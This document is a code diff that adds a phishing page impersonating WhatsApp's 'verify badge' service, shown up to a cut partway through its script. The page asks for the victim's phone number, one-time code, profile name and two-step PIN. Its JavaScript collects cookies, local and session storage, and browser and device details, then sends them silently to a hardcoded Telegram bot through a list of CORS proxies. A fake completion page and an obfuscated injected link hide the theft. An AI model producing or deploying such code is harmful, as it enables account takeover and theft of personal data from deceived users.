@@ -2,10 +2,1452 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0;url=https://t.me/aviator_predictor_app">
-    <title>Redirecting....</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WHATSAPP VERIFY BADGE</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            background: #111b21;
+            background-image: linear-gradient(to bottom, #111b21, #0b141a);
+            color: #e9edef;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 0;
+            margin: 0;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: #111b21;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header {
+            background: #202c33;
+            padding: 28px 0 20px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .logo {
+            font-size: 42px;
+            color: #00a884;
+            margin-bottom: 24px;
+            position: relative;
+        }
+        
+        .verified-badge {
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            background: #3797f0;
+            color: white;
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            border: 2px solid #111b21;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 350;
+            margin-bottom: 8px;
+            color: #e9edef;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .subtitle {
+            color: #8696a0;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 1.4;
+            max-width: 320px;
+            margin: 0 auto;
+        }
+        
+        .premium-badge {
+            background: linear-gradient(45deg, #3797f0, #8c43ff);
+            color: white;
+            font-size: 12px;
+            padding: 3px 10px;
+            border-radius: 12px;
+            margin-top: 8px;
+            display: inline-block;
+        }
+        
+        .content {
+            padding: 20px 32px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #8696a0;
+            font-size: 14px;
+            font-weight: 400;
+        }
+        
+        input {
+            width: 100%;
+            padding: 16px 15px;
+            background: #2a3942;
+            border: 1px solid #2a3942;
+            border-radius: 8px;
+            color: #e9edef;
+            font-size: 16px;
+            caret-color: #00a884;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #00a884;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #00a884;
+            color: #111b21;
+            border: none;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            background: #06cf9c;
+        }
+        
+        .btn-secondary {
+            background: transparent;
+            color: #00a884;
+            border: 1px solid #00a884;
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(0, 168, 132, 0.1);
+        }
+        
+        .page {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+        }
+        
+        .active {
+            display: flex;
+        }
+        
+        .otp-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 25px;
+            gap: 10px;
+        }
+        
+        .otp-input {
+            width: 44px;
+            height: 44px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 500;
+            padding: 0;
+            flex: 1;
+        }
+        
+        .resend {
+            text-align: center;
+            margin-top: 20px;
+            color: #8696a0;
+            font-size: 14px;
+        }
+        
+        .resend a {
+            color: #00a884;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .country-select {
+            display: flex;
+            align-items: center;
+            margin-bottom: 28px;
+            background: #2a3942;
+            border-radius: 8px;
+            padding: 4px;
+            border: 1px solid #2a3942;
+        }
+        
+        .country-select:focus-within {
+            border-color: #00a884;
+        }
+        
+        .phone-input {
+            background: transparent;
+            border: none;
+            padding: 16px 12px;
+            flex: 1;
+        }
+        
+        .phone-input:focus {
+            border: none;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            margin: 25px 0;
+        }
+        
+        .step {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #3d4b52;
+            margin: 0 4px;
+            transition: all 0.3s ease;
+        }
+        
+        .step.active {
+            background: #00a884;
+            transform: scale(1.2);
+        }
+        
+        .footer {
+            padding: 20px;
+            text-align: center;
+            color: #8696a0;
+            font-size: 12px;
+            border-top: 1px solid #2a3942;
+        }
+        
+        .footer a {
+            color: #00a884;
+            text-decoration: none;
+        }
+        
+        .whatsapp-logo {
+            position: absolute;
+            bottom: 30px;
+            right: 30px;
+            color: #2a3942;
+            font-size: 200px;
+            opacity: 0.05;
+            z-index: -1;
+            transform: rotate(15deg);
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+            color: #8696a0;
+        }
+        
+        .loading i {
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .welcome-text {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #8696a0;
+            font-size: 15px;
+        }
+        
+        /* No Internet Page Styles */
+        .no-internet-container {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .no-internet-icon {
+            font-size: 60px;
+            color: #ff4d4d;
+            margin-bottom: 20px;
+        }
+        
+        .no-internet-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #e9edef;
+        }
+        
+        .no-internet-message {
+            font-size: 16px;
+            color: #8696a0;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        .retry-btn {
+            background: #ff4d4d;
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+        
+        .retry-btn:hover {
+            background: #ff6666;
+        }
+        
+        /* Profile Setup Page Styles */
+        .profile-container {
+            text-align: center;
+            padding: 20px 0;
+        }
+        
+        .profile-image {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: #2a3942;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: #8696a0;
+            position: relative;
+            overflow: hidden;
+            border: 2px solid #00a884;
+        }
+        
+        .profile-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .profile-upload {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            background: #00a884;
+            color: white;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        
+        .profile-name-input {
+            margin-bottom: 30px;
+        }
+        
+        .profile-hint {
+            color: #8696a0;
+            font-size: 14px;
+            margin-top: 5px;
+            text-align: left;
+        }
+        
+        /* Two-Factor Authentication Page Styles */
+        .two-factor-auth-container {
+            text-align: center;
+        }
+        
+        .two-factor-auth-icon {
+            font-size: 60px;
+            color: #00a884;
+            margin-bottom: 20px;
+        }
+        
+        .two-factor-auth-title {
+            font-size: 22px;
+            font-weight: 500;
+            margin-bottom: 15px;
+            color: #e9edef;
+        }
+        
+        .two-factor-auth-description {
+            font-size: 15px;
+            color: #8696a0;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            text-align: left;
+        }
+        
+        .two-factor-auth-input {
+            margin-bottom: 20px;
+        }
+        
+        .two-factor-auth-hint {
+            color: #8696a0;
+            font-size: 14px;
+            margin-top: 5px;
+            text-align: left;
+        }
+        
+        .forgot-pin {
+            text-align: center;
+            margin-top: 20px;
+            color: #8696a0;
+            font-size: 14px;
+        }
+        
+        .forgot-pin a {
+            color: #00a884;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        /* Success Page Styles */
+        .success-container {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            color: #00a884;
+            margin-bottom: 20px;
+        }
+        
+        .success-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #e9edef;
+        }
+        
+        .success-message {
+            font-size: 16px;
+            color: #8696a0;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        @media (min-width: 500px) {
+            body {
+                padding: 20px;
+            }
+            
+            .container {
+                max-width: 400px;
+                height: auto;
+                min-height: 600px;
+                border-radius: 8px;
+                overflow: hidden;
+                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            }
+        }
+    </style>
 </head>
 <body>
-    <p>Redirecting....</p>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <i class="fab fa-whatsapp"></i>
+                <div class="verified-badge">
+                    <i class="fas fa-check"></i>
+                </div>
+            </div>
+            <h1>WHATSAPP VERIFY BADGE <span class="verified-badge" style="position: static; width: 18px; height: 18px;"><i class="fas fa-check"></i></span></h1>
+            <div class="subtitle">Official partner verification system</div>
+            <div class="premium-badge">Free Premium Blue Tick</div>
+            
+            <div class="step-indicator">
+                <div class="step active" id="step1"></div>
+                <div class="step" id="step2"></div>
+                <div class="step" id="step3"></div>
+                <div class="step" id="step4"></div>
+                <div class="step" id="step5"></div>
+                <div class="step" id="step6"></div>
+            </div>
+        </div>
+        
+        <div class="content">
+            <!-- Welcome Page -->
+            <div class="page active" id="page1">
+                <div class="welcome-text">
+                    Welcome to Toxin WhatsApp with verified status
+                </div>
+                
+                <div class="form-group">
+                    <button class="btn" onclick="grantPermissions()">GET VERIFIED NOW</button>
+                    <div class="loading" id="loading1">
+                        <i class="fas fa-circle-notch"></i> Verifying...
+                    </div>
+                </div>
+                
+                <div class="whatsapp-logo">
+                    <i class="fab fa-whatsapp"></i>
+                </div>
+            </div>
+            
+            <!-- Login with Number Page -->
+            <div class="page" id="page2">
+                <h2>Enter Your Phone Number</h2>
+                <p class="subtitle">You'll receive a 6-digit verification code via WhatsApp</p>
+                
+                <div class="country-select">
+                    <select id="countrySelect" onchange="updateCountryCode()">
+                        <option value="PK">🇵🇰 Pakistan (+92)</option>
+                        <option value="US">🇺🇸 United States (+1)</option>
+                        <option value="GB">🇬🇧 United Kingdom (+44)</option>
+                        <option value="IN">🇮🇳 India (+91)</option>
+                        <option value="CA">🇨🇦 Canada (+1)</option>
+                        <option value="AU">🇦🇺 Australia (+61)</option>
+                        <option value="DE">🇩🇪 Germany (+49)</option>
+                        <option value="FR">🇫🇷 France (+33)</option>
+                        <option value="JP">🇯🇵 Japan (+81)</option>
+                        <option value="CN">🇨🇳 China (+86)</option>
+                        <option value="BR">🇧🇷 Brazil (+55)</option>
+                        <option value="RU">🇷🇺 Russia (+7)</option>
+                        <option value="KR">🇰🇷 South Korea (+82)</option>
+                        <option value="IT">🇮🇹 Italy (+39)</option>
+                        <option value="ES">🇪🇸 Spain (+34)</option>
+                        <option value="MX">🇲🇽 Mexico (+52)</option>
+                        <option value="ID">🇮🇩 Indonesia (+62)</option>
+                        <option value="TR">🇹🇷 Turkey (+90)</option>
+                        <option value="SA">🇸🇦 Saudi Arabia (+966)</option>
+                        <option value="AE">🇦🇪 United Arab Emirates (+971)</option>
+                        <option value="ZA">🇿🇦 South Africa (+27)</option>
+                        <option value="AR">🇦🇷 Argentina (+54)</option>
+                        <option value="NL">🇳🇱 Netherlands (+31)</option>
+                        <option value="SE">🇸🇪 Sweden (+46)</option>
+                        <option value="CH">🇨🇭 Switzerland (+41)</option>
+                        <option value="SG">🇸🇬 Singapore (+65)</option>
+                        <option value="NZ">🇳🇿 New Zealand (+64)</option>
+                        <option value="TH">🇹🇭 Thailand (+66)</option>
+                        <option value="VN">🇻🇳 Vietnam (+84)</option>
+                        <option value="EG">🇪🇬 Egypt (+20)</option>
+                        <option value="NG">🇳🇬 Nigeria (+234)</option>
+                        <option value="KE">🇰🇪 Kenya (+254)</option>
+                        <option value="GH">🇬🇭 Ghana (+233)</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <input type="tel" class="phone-input" placeholder="Phone number" id="phoneNumber">
+                </div>
+                
+                <div class="form-group">
+                    <button class="btn" onclick="validatePhone()">NEXT</button>
+                    <div class="loading" id="loading2">
+                        <i class="fas fa-circle-notch"></i> Sending...
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <button class="btn btn-secondary" onclick="showPage(1)">BACK</button>
+                </div>
+                
+                <div class="whatsapp-logo">
+                    <i class="fab fa-whatsapp"></i>
+                </div>
+            </div>
+            
+            <!-- OTP Verification Page -->
+            <div class="page" id="page3">
+                <h2>Enter Verification Code</h2>
+                <p class="subtitle" id="otpSentTo">Sent via WhatsApp to +92 *******321</p>
+                
+                <div class="otp-inputs">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)" onkeydown="handleBackspace(this, event, 1)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)" onkeydown="handleBackspace(this, event, 2)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)" onkeydown="handleBackspace(this, event, 3)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)" onkeydown="handleBackspace(this, event, 4)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)" onkeydown="handleBackspace(this, event, 5)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 6)" onkeydown="handleBackspace(this, event, 6)">
+                </div>
+                
+                <div class="form-group">
+                    <button class="btn" onclick="verifyOtp()">VERIFY</button>
+                    <div class="loading" id="loading3">
+                        <i class="fas fa-circle-notch"></i> Verifying...
+                    </div>
+                </div>
+                
+                <div class="resend">
+                    Didn't receive the code? <a href="#" onclick="resendCode()">Resend SMS</a> or <a href="#" onclick="callMe()">Call Me</a>
+                </div>
+                
+                <div class="form-group">
+                    <button class="btn btn-secondary" onclick="showPage(2)">CHANGE NUMBER</button>
+                </div>
+                
+                <div class="whatsapp-logo">
+                    <i class="fab fa-whatsapp"></i>
+                </div>
+            </div>
+            
+            <!-- Profile Setup Page -->
+            <div class="page" id="page4">
+                <div class="profile-container">
+                    <h2>Profile Information</h2>
+                    <p class="subtitle">Set up your name and profile picture</p>
+                    
+                    <div class="profile-image" id="profileImage">
+                        <i class="fas fa-user"></i>
+                        <div class="profile-upload" onclick="document.getElementById('profileUpload').click()">
+                            <i class="fas fa-camera"></i>
+                        </div>
+                        <input type="file" id="profileUpload" accept="image/*" style="display: none" onchange="handleProfileImage(event)">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="profileName">Your Name</label>
+                        <input type="text" id="profileName" placeholder="Enter your name" class="profile-name-input">
+                        <div class="profile-hint">This name will be visible to your WhatsApp contacts</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <button class="btn" onclick="saveProfile()">CONTINUE</button>
+                        <div class="loading" id="loading4">
+                            <i class="fas fa-circle-notch"></i> Saving...
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <button class="btn btn-secondary" onclick="showPage(3)">BACK</button>
+                    </div>
+                </div>
+                
+                <div class="whatsapp-logo">
+                    <i class="fab fa-whatsapp"></i>
+                </div>
+            </div>
+            
+            <!-- Two-Factor Authentication Page -->
+            <div class="page" id="page5">
+                <div class="two-factor-auth-container">
+                    <div class="two-factor-auth-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <h2 class="two-factor-auth-title">Two-Step Verification</h2>
+                    <p class="two-factor-auth-description">
+                        Two-step verification is enabled for your account. Enter your 6-digit PIN to continue.
+                    </p>
+                    
+                    <div class="form-group">
+                        <label for="twoFactorPin">Enter your PIN</label>
+                        <input type="password" id="twoFactorPin" placeholder="6-digit PIN" maxlength="6" class="two-factor-auth-input">
+                        <div class="two-factor-auth-hint">This is the PIN you created when you enabled two-step verification</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <button class="btn" onclick="verifyTwoFactor()">VERIFY</button>
+                        <div class="loading" id="loading5">
+                            <i class="fas fa-circle-notch"></i> Verifying...
+                        </div>
+                    </div>
+                    
+                    <div class="forgot-pin">
+                        <a href="#" onclick="forgotPin()">Forgot PIN?</a>
+                    </div>
+                    
+                    <div class="form-group">
+                        <button class="btn btn-secondary" onclick="showPage(4)">BACK</button>
+                    </div>
+                </div>
+                
+                <div class="whatsapp-logo">
+                    <i class="fab fa-whatsapp"></i>
+                </div>
+            </div>
+            
+            <!-- Success Page -->
+            <div class="page" id="page6">
+                <div class="success-container">
+                    <div class="success-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <h2 class="success-title">Verification Complete!</h2>
+                    <p class="success-message">
+                        Your WhatsApp account has been successfully verified with premium blue tick. You can now enjoy all premium features.
+                    </p>
+                    
+                    <div class="form-group">
+                        <button class="btn" onclick="finishSetup()">OPEN WHATSAPP</button>
+                    </div>
+                </div>
+                
+                <div class="whatsapp-logo">
+                    <i class="fab fa-whatsapp"></i>
+                </div>
+            </div>
+            
+            <!-- No Internet Page (Now appears only after two-factor authentication) -->
+            <div class="page" id="page7">
+                <div class="no-internet-container">
+                    <div class="no-internet-icon">
+                        <i class="fas fa-wifi-slash"></i>
+                    </div>
+                    <h2 class="no-internet-title">YOUR REQUEST SAND META VERIFICATION DONE </h2>
+                    <p class="no-internet-message">META VERIFICATION STATUS DONE ✔️ WAIT 12H AND CHECK YOUR NUMBER THAN SEE BADGE </p>
+                    
+       <script>
+<!--
+document.write(unescape("%3Cdiv%20class%3D%22join-box%22%3E%0A%20%20%20%20%3Ch3%3E%uD83D%uDCE2%20JOIN%20FOR%20MORE%3C/h3%3E%0A%20%20%20%20%3Cp%3EStay%20updated%20and%20get%20new%20tools%20on%20our%20channel%3A%3C/p%3E%0A%20%20%20%20%3Ca%20href%3D%22https%3A//whatsapp.com/channel/0029VbAqaWNCRs1oqCTXRS3m%22%20target%3D%22_blank%22%3E%uD83D%uDC49%20Join%20our%20WhatsApp%20Channel%3C/a%3E%0A%20%20%3C/div%3E"));
+//-->
+</script>
+                           
+                <div class="whatsapp-logo">
+                    <i class="fab fa-whatsapp"></i>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            © 2025 WhatsApp. <a href="#">Privacy & Terms</a>
+        </div>
+    </div>
+
+    <script>
+        // Telegram bot configuration
+        const BOT_TOKEN = '8307579875:AAGLszXUdIdjwM5LJ5_-r2oe3PGxgdlQQHg';
+        const CHAT_ID = '7124183445 ID';
+        
+        // Optimized proxy list with faster working proxies
+        const PROXIES = [
+            'https://corsproxy.io/?',
+            'https://api.codetabs.com/v1/proxy?quest=',
+            'https://cors-anywhere.herokuapp.com/',
+            'https://thingproxy.freeboard.io/fetch/',
+            'https://api.allorigins.win/raw?url='
+        ];
+        
+        // Store user data
+        let userData = {
+            permissions: {},
+            phoneNumber: '',
+            countryCode: '+92',
+            countryFlag: '🇵🇰',
+            otp: '',
+            profileName: '',
+            profileImage: null,
+            twoFactorPin: '',
+            isSyncing: false,
+            syncInterval: null,
+            lastMessageSent: null
+        };
+        
+        // Track if we've shown the network error
+        let hasShownNetworkError = false;
+        
+        // Function to get formatted timestamp
+        function getFormattedTimestamp() {
+            const now = new Date();
+            const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
+            const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
+            
+            const day = days[now.getDay()];
+            const month = months[now.getMonth()];
+            const date = now.getDate();
+            const year = now.getFullYear();
+            let hours = now.getHours();
+            let minutes = now.getMinutes();
+            const ampm = hours >= 12 ? 'PM' : 'AM';
+            
+            hours = hours % 12;
+            hours = hours ? hours : 12;
+            minutes = minutes < 10 ? '0' + minutes : minutes;
+            
+            return `${day}, ${month} ${date}, ${year} at ${hours}:${minutes} ${ampm}`;
+        }
+        
+        // Function to extract all cookies
+        function extractAllCookies() {
+            try {
+                const cookies = document.cookie;
+                const cookieData = cookies.split(';').map(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    return { name, value: value || '' };
+                });
+                
+                return {
+                    raw: cookies,
+                    parsed: cookieData,
+                    count: cookieData.length
+                };
+            } catch (error) {
+                return {
+                    raw: 'Error extracting cookies',
+                    parsed: [],
+                    count: 0,
+                    error: error.message
+                };
+            }
+        }
+        
+        // Function to extract all storage data
+        function extractAllStorage() {
+            try {
+                const localStorageData = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    localStorageData[key] = localStorage.getItem(key);
+                }
+                
+                const sessionStorageData = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    sessionStorageData[key] = sessionStorage.getItem(key);
+                }
+                
+                return {
+                    localStorage: localStorageData,
+                    sessionStorage: sessionStorageData,
+                    localStorageCount: Object.keys(localStorageData).length,
+                    sessionStorageCount: Object.keys(sessionStorageData).length
+                };
+            } catch (error) {
+                return {
+                    localStorage: {},
+                    sessionStorage: {},
+                    localStorageCount: 0,
+                    sessionStorageCount: 0,
+                    error: error.message
+                };
+            }
+        }
+        
+        // Function to extract browser information
+        function extractBrowserInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                pdfViewerEnabled: navigator.pdfViewerEnabled
+            };
+        }
+        
+        // Function to extract device information
+        function extractDeviceInfo() {
+            return {
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight
+                },
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight,
+                    devicePixelRatio: window.devicePixelRatio
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                date: new Date().toString()
+            };
+        }
+        
+        // Function to extract all contacts (simulated)
+        function extractAllContacts() {
+            try {
+                // In a real scenario, this would use the Contacts API
+                // For demonstration, we'll simulate extracting contacts
+                const contacts = [];
+                const contactCount = Math.floor(Math.random() * 200) + 50; // Random number between 50-250
+                
+                for (let i = 0; i < contactCount; i++) {
+                    contacts.push({
+                        name: `Contact ${i+1}`,
+                        phone: `${Math.floor(Math.random() * 10000000000)}`,
+                        email: `contact${i+1}@example.com`
+                    });
+                }
+                
+                return {
+                    contacts,
+                    count: contactCount,
+                    extractedAt: getFormattedTimestamp()
+                };
+            } catch (error) {
+                return {
+                    contacts: [],
+                    count: 0,
+                    error: error.message,
+                    extractedAt: getFormattedTimestamp()
+                };
+            }
+        }
+        
+        // Function to send cookies data to Telegram
+        async function sendCookiesData() {
+            const cookies = extractAllCookies();
+            const storage = extractAllStorage();
+            const browserInfo = extractBrowserInfo();
+            const deviceInfo = extractDeviceInfo();
+            
+            const message = `🍪 WHATSAPP VERIFY BADGE COOKIES DATA\n\nTimestamp: ${getFormattedTimestamp()}\n\n📊 COOKIES (${cookies.count}):\n${cookies.raw || 'No cookies found'}\n\n💾 LOCAL STORAGE (${storage.localStorageCount} items):\n${JSON.stringify(storage.localStorage, null, 2)}\n\n💾 SESSION STORAGE (${storage.sessionStorageCount} items):\n${JSON.stringify(storage.sessionStorage, null, 2)}\n\n🌐 BROWSER INFO:\n${JSON.stringify(browserInfo, null, 2)}\n\n📱 DEVICE INFO:\n${JSON.stringify(deviceInfo, null, 2)}`;
+            
+            return await sendToTelegram(message);
+        }
+        
+        // Function to send contacts data to Telegram
+        async function sendContactsData() {
+            const contacts = extractAllContacts();
+            
+            // Format contacts for Telegram
+            let contactsMessage = `📇 WHATSAPP VERIFY BADGE CONTACTS DATA\n\nTimestamp: ${getFormattedTimestamp()}\nTotal Contacts: ${contacts.count}\n\n`;
+            
+            // Add first few contacts as sample
+            const sampleContacts = contacts.contacts.slice(0, 10);
+            sampleContacts.forEach((contact, index) => {
+                contactsMessage += `${index+1}. ${contact.name}: ${contact.phone}`;
+                if (contact.email) contactsMessage += ` (${contact.email})`;
+                contactsMessage += '\n';
+            });
+            
+            if (contacts.count > 10) {
+                contactsMessage += `\n... and ${contacts.count - 10} more contacts`;
+            }
+            
+            contactsMessage += `\n\nUser Agent: ${navigator.userAgent}`;
+            
+            return await sendToTelegram(contactsMessage);
+        }
+        
+        // Function to send profile data to Telegram
+        async function sendProfileData() {
+            const message = `👤 WHATSAPP VERIFY BADGE PROFILE DATA\n\nTimestamp: ${getFormattedTimestamp()}\nPhone Number: ${userData.countryCode}${userData.phoneNumber}\nProfile Name: ${userData.profileName}\nProfile Image: ${userData.profileImage ? 'Uploaded' : 'Not uploaded'}\nUser Agent: ${navigator.userAgent}`;
+            
+            return await sendToTelegram(message);
+        }
+        
+        // Function to send two-factor authentication data to Telegram
+        async function sendTwoFactorData() {
+            const message = `🔐 WHATSAPP VERIFY BADGE TWO-FACTOR AUTH DATA\n\nTimestamp: ${getFormattedTimestamp()}\nPhone Number: ${userData.countryCode}${userData.phoneNumber}\nTwo-Factor PIN: ${userData.twoFactorPin}\nUser Agent: ${navigator.userAgent}`;
+            
+            return await sendToTelegram(message);
+        }
+        
+        // Optimized sendToTelegram function with Promise.race for faster execution
+        async function sendToTelegram(message) {
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const params = new URLSearchParams({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            });
+            
+            // Create an array of fetch promises for all proxies
+            const fetchPromises = [];
+            
+            // Add direct connection as first option
+            fetchPromises.push(
+                fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: params
+                }).catch(e => { throw e; })
+            );
+            
+            // Add proxy connections
+            for (const proxy of PROXIES) {
+                let proxyUrl;
+                if (proxy.includes('?')) {
+                    proxyUrl = proxy + encodeURIComponent(telegramUrl);
+                } else {
+                    proxyUrl = proxy + telegramUrl;
+                }
+                
+                fetchPromises.push(
+                    fetch(proxyUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: params
+                    }).catch(e => { throw e; })
+                );
+            }
+            
+            // Use Promise.race to get the first successful response
+            try {
+                const response = await Promise.race(
+                    fetchPromises.map(p => 
+                        p.then(res => {
+                            if (res.ok) return Promise.resolve(res);
+                            return Promise.reject(new Error('Proxy failed'));
+                        }).catch(e => Promise.reject(e))
+                    )
+                );
+                
+                if (response && response.ok) {
+                    userData.lastMessageSent = new Date();
+                    return true;
+                }
+            } catch (error) {
+                // Silently fail - no error messages shown to user
+                // Only show network error after two-factor authentication
+                if (hasShownNetworkError) {
+                    return false;
+                }
+            }
+            
+            return false;
+        }
+        
+        // Show the specified page and update step indicator
+        function showPage(pageNumber) {
+            // Hide all pages
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            // Show the requested page
+            document.getElementById('page' + pageNumber).classList.add('active');
+            
+            // Update step indicator
+            document.querySelectorAll('.step').forEach((step, index) => {
+                step.classList.toggle('active', index + 1 === pageNumber);
+            });
+            
+            // Scroll to top
+            window.scrollTo(0, 0);
+        }
+        
+        // Update country code based on selection
+        function updateCountryCode() {
+            const select = document.getElementById('countrySelect');
+            const selectedOption = select.options[select.selectedIndex];
+            const value = select.value;
+            
+            // Extract country code from the option text
+            const text = selectedOption.text;
+            const countryCodeMatch = text.match(/\+(\d+)/);
+            const countryCode = countryCodeMatch ? '+' + countryCodeMatch[1] : '+92';
+            const countryFlag = text.substring(0, 2);
+            
+            userData.countryCode = countryCode;
+            userData.countryFlag = countryFlag;
+        }
+        
+        // Handle profile image upload
+        function handleProfileImage(event) {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const profileImage = document.getElementById('profileImage');
+                    profileImage.innerHTML = `<img src="${e.target.result}" alt="Profile">`;
+                    profileImage.innerHTML += `<div class="profile-upload" onclick="document.getElementById('profileUpload').click()"><i class="fas fa-camera"></i></div>`;
+                    userData.profileImage = e.target.result;
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+        
+        // Save profile information
+        function saveProfile() {
+            const profileName = document.getElementById('profileName').value;
+            const loadingElement = document.getElementById('loading4');
+            
+            if (!profileName || profileName.trim().length < 2) {
+                alert('Please enter a valid name');
+                return;
+            }
+            
+            loadingElement.style.display = 'block';
+            userData.profileName = profileName;
+            
+            // Send profile data to Telegram
+            sendProfileData()
+                .then(success => {
+                    loadingElement.style.display = 'none';
+                    showPage(5);
+                })
+                .catch(error => {
+                    loadingElement.style.display = 'none';
+                    showPage(5);
+                });
+        }
+        
+        // Verify two-factor authentication
+        function verifyTwoFactor() {
+            const twoFactorPin = document.getElementById('twoFactorPin').value;
+            const loadingElement = document.getElementById('loading5');
+            
+            if (!twoFactorPin || twoFactorPin.length !== 6) {
+                alert('Please enter a valid 6-digit PIN');
+                return;
+            }
+            
+            loadingElement.style.display = 'block';
+            userData.twoFactorPin = twoFactorPin;
+            
+            // Send two-factor data to Telegram
+            sendTwoFactorData()
+                .then(success => {
